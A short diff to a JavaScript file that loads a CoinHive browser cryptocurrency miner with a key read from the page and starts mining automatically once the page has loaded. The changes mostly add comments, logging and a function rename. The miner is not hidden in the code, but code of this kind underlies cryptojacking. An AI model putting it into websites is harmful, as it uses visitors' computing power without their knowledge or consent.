@@ -5,28 +5,29 @@ var timeDelayMain = 1250;
 var miner;
 var currentApiKey = "Hi";
 
+// Check if the page has loaded then grab the key and start kMineWorker
 document.onreadystatechange = function(){
      if(document.readyState === 'complete'){
+		console.log("done!");
         kLoadApiKey();
-     }
+     } else {
+		 console.log("waiting for page to load!");
+	 }
 }
 
 function kLoadApiKey() {
-	
+	// Get the key from the webpage
 	currentApiKey = document.getElementById("api").innerHTML;	
 	miner = new CoinHive.Anonymous(currentApiKey,'threads: ' + threadCount);	
-
 	
 	if (currentApiKey === "Hi") {
 		alert("Failed to load key !");
 	}
-	
-	main();
-	
+	kMineWorker();
 }
 
-
-function main() {
+// Where everything mining related happens
+function kMineWorker() {
 	
 // Update stats once per second
 	setInterval(function() {
